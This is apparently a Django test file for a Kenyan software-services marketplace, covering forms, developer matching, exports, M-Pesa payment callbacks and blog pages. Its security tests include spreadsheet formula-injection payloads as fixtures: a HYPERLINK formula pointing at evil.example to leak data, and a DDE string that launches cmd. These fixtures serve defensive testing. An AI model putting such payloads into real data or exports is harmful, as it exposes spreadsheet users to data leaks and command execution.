import json

from django.contrib.auth.models import User
from django.test import TestCase
from django.urls import reverse

from .models import (
    Assignment,
    BlogPost,
    DeveloperApplication,
    DeveloperProfile,
    Payment,
    ProjectRequest,
    ServiceCategory,
)
from .services import generate_quote


class MarketplaceFlowTests(TestCase):
    def setUp(self):
        self.website, _ = ServiceCategory.objects.update_or_create(
            slug="business-website",
            defaults={
                "name": "Business website",
                "min_price": 20_000,
                "max_price": 80_000,
                "deposit_amount": 2_000,
            },
        )

    def test_project_brief_submission_saves_quote_and_deposit(self):
        response = self.client.post(
            reverse("marketplace:home"),
            {
                "form-name": "project-brief",
                "name": "Amani Clinic",
                "phone": "0716343561",
                "email": "amani@example.com",
                "service": "Business website",
                "budget": "KSh 20,000-80,000",
                "timeline": "Within 1-2 months",
                "details": "We need a clinic website with services, doctors, and contact form.",
                "utm_source": "tiktok",
                "utm_medium": "paid",
                "utm_campaign": "launch",
            },
            follow=True,
        )

        self.assertEqual(response.status_code, 200)
        project = ProjectRequest.objects.get(email="amani@example.com")
        self.assertEqual(project.deposit_amount, 2_000)
        self.assertEqual(project.estimated_min, 20_000)
        self.assertEqual(project.utm_source, "tiktok")

    def test_developer_application_submission_saves(self):
        response = self.client.post(
            reverse("marketplace:home"),
            {
                "form-name": "developer-application",
                "developerName": "Njeri Dev",
                "stack": "Django, React",
                "portfolio": "https://example.com",
            },
            follow=True,
        )

        self.assertEqual(response.status_code, 200)
        self.assertEqual(DeveloperApplication.objects.count(), 1)
        self.assertEqual(DeveloperApplication.objects.get().name, "Njeri Dev")

    def test_homepage_has_pricing_faq_and_seo_copy(self):
        response = self.client.get(reverse("marketplace:home"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Pricing guidance")
        self.assertContains(response, "Business Website")
        self.assertContains(response, "Maintenance / Support")
        self.assertContains(response, "How much does a website cost?")
        self.assertContains(response, "How do you choose developers?")
        self.assertContains(response, "software developers in Kenya")
        self.assertNotContains(response, "Selected project styles")

    def test_matching_suggests_vetted_developer(self):
        developer = DeveloperProfile.objects.create(
            name="Otieno Apps",
            email="otieno@example.com",
            stack="web app django react",
            status=DeveloperProfile.Status.VETTED,
            availability_score=8,
            quality_score=9,
        )
        developer.service_categories.add(self.website)
        project = ProjectRequest.objects.create(
            name="Retail Shop",
            phone="0712345678",
            email="shop@example.com",
            service_label="Business website",
            budget="KSh 20,000-80,000",
            timeline="Within 1-2 months",
            details="A shop website.",
        )
        generate_quote(project)

        from .services import assign_best_developers

        matches = assign_best_developers(project)

        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].developer, developer)
        self.assertEqual(Assignment.objects.count(), 1)

    def test_staff_can_export_project_requests_csv(self):
        User.objects.create_superuser("admin", "admin@example.com", "password")
        self.client.login(username="admin", password="password")
        ProjectRequest.objects.create(
            name="Export Client",
            phone="0712345678",
            email="export@example.com",
            service_label="Business website",
            budget="KSh 20,000-80,000",
            timeline="Within 1-2 months",
            details="Export me.",
        )

        response = self.client.get(reverse("marketplace:export_project_requests"))

        self.assertEqual(response.status_code, 200)
        self.assertIn("text/csv", response["Content-Type"])
        self.assertContains(response, "export@example.com")

        xlsx_response = self.client.get(reverse("marketplace:export_project_requests_xlsx"))
        self.assertEqual(xlsx_response.status_code, 200)
        self.assertIn(
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            xlsx_response["Content-Type"],
        )
        self.assertGreater(len(xlsx_response.content), 1000)

    def test_mpesa_callback_marks_payment_paid(self):
        project = ProjectRequest.objects.create(
            name="Payment Client",
            phone="0712345678",
            email="payment@example.com",
            service_label="Business website",
            budget="KSh 20,000-80,000",
            timeline="Within 1-2 months",
            details="Payment test.",
            deposit_amount=2_000,
        )
        payment = Payment.objects.create(
            project=project,
            amount=2_000,
            phone="0712345678",
            checkout_request_id="ws_CO_123",
        )
        payload = {
            "Body": {
                "stkCallback": {
                    "CheckoutRequestID": "ws_CO_123",
                    "ResultCode": 0,
                    "ResultDesc": "Success",
                    "CallbackMetadata": {
                        "Item": [
                            {"Name": "MpesaReceiptNumber", "Value": "RCP123"},
                        ]
                    },
                }
            }
        }

        response = self.client.post(
            reverse("marketplace:mpesa_callback"),
            data=json.dumps(payload),
            content_type="application/json",
        )

        payment.refresh_from_db()
        project.refresh_from_db()
        self.assertEqual(response.status_code, 200)
        self.assertEqual(payment.status, Payment.Status.PAID)
        self.assertEqual(payment.mpesa_receipt, "RCP123")
        self.assertEqual(project.status, ProjectRequest.Status.DEPOSIT_PAID)

    def test_studio_menu_pages_render(self):
        for name in ["team", "about", "process", "blog_list"]:
            response = self.client.get(reverse(f"marketplace:{name}"))
            self.assertEqual(response.status_code, 200)
            self.assertContains(response, "Our Team")
            self.assertContains(response, "About Us")
            self.assertContains(response, "Our Process")
            self.assertContains(response, "Blog")
            self.assertContains(response, "theme-toggle")

    def test_blog_only_shows_published_posts(self):
        published = BlogPost.objects.create(
            title="How to plan a web app",
            slug="how-to-plan-a-web-app",
            excerpt="A short guide for Kenyan businesses.",
            body="Start with goals, users, and budget.",
            status=BlogPost.Status.PUBLISHED,
        )
        BlogPost.objects.create(
            title="Draft pricing notes",
            slug="draft-pricing-notes",
            excerpt="Not visible yet.",
            body="Draft body.",
            status=BlogPost.Status.DRAFT,
        )

        list_response = self.client.get(reverse("marketplace:blog_list"))
        self.assertContains(list_response, published.title)
        self.assertNotContains(list_response, "Draft pricing notes")

        detail_response = self.client.get(
            reverse("marketplace:blog_detail", kwargs={"slug": published.slug})
        )
        self.assertContains(detail_response, published.body)

        draft_response = self.client.get(
            reverse("marketplace:blog_detail", kwargs={"slug": "draft-pricing-notes"})
        )
        self.assertEqual(draft_response.status_code, 404)

    def test_published_blog_sets_published_at(self):
        post = BlogPost.objects.create(
            title="Quote planning basics",
            slug="quote-planning-basics",
            excerpt="A quick guide.",
            body="Know your scope before asking for estimates.",
            status=BlogPost.Status.PUBLISHED,
        )

        self.assertIsNotNone(post.published_at)


def make_project(**kwargs):
    defaults = {
        "name": "Cb Client",
        "phone": "0712345678",
        "email": "cb@example.com",
        "service_label": "Business website",
        "budget": "KSh 20,000-80,000",
        "timeline": "Within 1-2 months",
        "details": "Callback test.",
        "deposit_amount": 2_000,
    }
    defaults.update(kwargs)
    return ProjectRequest.objects.create(**defaults)


def stk_payload(checkout_id="ws_CO_SEC", result_code=0, items=None):
    stk = {
        "CheckoutRequestID": checkout_id,
        "ResultCode": result_code,
        "ResultDesc": "Desc",
    }
    if items is not None:
        stk["CallbackMetadata"] = {"Item": items}
    return {"Body": {"stkCallback": stk}}


class MpesaCallbackSecurityTests(TestCase):
    """Regression net for the callback hardening: token auth, blank-checkout
    rejection, amount validation, replay/idempotency, malformed JSON."""

    def setUp(self):
        self.project = make_project()
        self.payment = Payment.objects.create(
            project=self.project,
            amount=2_000,
            phone="0712345678",
            checkout_request_id="ws_CO_SEC",
            status=Payment.Status.STK_SENT,
        )
        self.url = reverse("marketplace:mpesa_callback")

    def post_json(self, payload, url=None):
        return self.client.post(
            url or self.url, data=json.dumps(payload), content_type="application/json"
        )

    def test_forged_callback_rejected_without_token(self):
        with self.settings(MPESA_CALLBACK_TOKEN="s3cret"):
            resp = self.post_json(stk_payload(items=[
                {"Name": "MpesaReceiptNumber", "Value": "EVIL1"},
            ]))
            self.assertEqual(resp.status_code, 403)
            resp = self.post_json(
                stk_payload(), url=f"{self.url}?token=wrong"
            )
            self.assertEqual(resp.status_code, 403)
        self.payment.refresh_from_db()
        self.assertEqual(self.payment.status, Payment.Status.STK_SENT)

    def test_valid_token_accepted(self):
        with self.settings(MPESA_CALLBACK_TOKEN="s3cret"):
            resp = self.post_json(
                stk_payload(items=[
                    {"Name": "MpesaReceiptNumber", "Value": "RCP1"},
                    {"Name": "Amount", "Value": 2000},
                ]),
                url=f"{self.url}?token=s3cret",
            )
        self.assertEqual(resp.status_code, 200)
        self.payment.refresh_from_db()
        self.assertEqual(self.payment.status, Payment.Status.PAID)

    def test_blank_checkout_id_matches_nothing(self):
        # Payments created before the STK push have checkout_request_id="";
        # a payload without a CheckoutRequestID must never mark one paid.
        pending = Payment.objects.create(
            project=self.project, amount=2_000, phone="0712345678"
        )
        resp = self.post_json(stk_payload(checkout_id=""))
        self.assertEqual(resp.status_code, 200)
        self.assertIsNone(resp.json()["payment_id"])
        pending.refresh_from_db()
        self.assertEqual(pending.status, Payment.Status.PENDING)

    def test_amount_mismatch_not_marked_paid(self):
        resp = self.post_json(stk_payload(items=[
            {"Name": "MpesaReceiptNumber", "Value": "RCP2"},
            {"Name": "Amount", "Value": 1},
        ]))
        self.assertEqual(resp.status_code, 200)
        self.payment.refresh_from_db()
        self.assertNotEqual(self.payment.status, Payment.Status.PAID)
        self.assertIn("Amount mismatch", self.payment.result_description)
        self.project.refresh_from_db()
        self.assertNotEqual(self.project.status, ProjectRequest.Status.DEPOSIT_PAID)

    def test_replayed_failure_cannot_downgrade_paid_payment(self):
        self.post_json(stk_payload(items=[
            {"Name": "MpesaReceiptNumber", "Value": "RCP3"},
            {"Name": "Amount", "Value": 2000},
        ]))
        self.payment.refresh_from_db()
        self.assertEqual(self.payment.status, Payment.Status.PAID)
        # replay a failure for the same checkout id
        self.post_json(stk_payload(result_code=1032))
        self.payment.refresh_from_db()
        self.assertEqual(self.payment.status, Payment.Status.PAID)
        self.assertEqual(self.payment.mpesa_receipt, "RCP3")

    def test_malformed_json_returns_400_not_500(self):
        resp = self.client.post(
            self.url, data="{not json", content_type="application/json"
        )
        self.assertEqual(resp.status_code, 400)


class ExportSanitisationTests(TestCase):
    """Cells that Excel would treat as formulas must be neutralised."""

    def setUp(self):
        User.objects.create_superuser("admin2", "admin2@example.com", "password")
        self.client.login(username="admin2", password="password")
        make_project(
            name='=HYPERLINK("http://evil.example/?leak","click")',
            details="+2+5+cmd|' /C calc'!A0",
            budget="@SUM(1,2)",
        )

    def test_csv_export_neutralises_formulas(self):
        resp = self.client.get(reverse("marketplace:export_project_requests"))
        body = resp.content.decode("utf-8")
        self.assertIn("'=HYPERLINK", body)
        self.assertIn("'+2+5", body)
        self.assertIn("'@SUM", body)
        self.assertNotIn('\n=HYPERLINK', body)

    def test_xlsx_export_neutralises_formulas(self):
        import io
        import zipfile as zf
        resp = self.client.get(reverse("marketplace:export_project_requests_xlsx"))
        sheet = zf.ZipFile(io.BytesIO(resp.content)).read("xl/worksheets/sheet1.xml").decode("utf-8")
        self.assertIn("'=HYPERLINK", sheet)
        self.assertNotIn("<t>=HYPERLINK", sheet)


class HoneypotTests(TestCase):
    def test_honeypot_blocks_bot_submission(self):
        resp = self.client.post(
            reverse("marketplace:home"),
            {
                "form-name": "project-brief",
                "name": "Bot",
                "phone": "0700000000",
                "email": "bot@example.com",
                "service": "Business website",
                "budget": "KSh 20,000-80,000",
                "timeline": "Within 1-2 months",
                "details": "Spam",
                "website_url": "http://spam.example",
            },
            follow=True,
        )
        self.assertEqual(resp.status_code, 200)
        self.assertFalse(ProjectRequest.objects.filter(email="bot@example.com").exists())

    def test_oversized_details_rejected(self):
        resp = self.client.post(
            reverse("marketplace:home"),
            {
                "form-name": "project-brief",
                "name": "Big",
                "phone": "0700000000",
                "email": "big@example.com",
                "service": "Business website",
                "budget": "KSh 20,000-80,000",
                "timeline": "Within 1-2 months",
                "details": "x" * 6000,
            },
            follow=True,
        )
        self.assertEqual(resp.status_code, 200)
        self.assertFalse(ProjectRequest.objects.filter(email="big@example.com").exists())
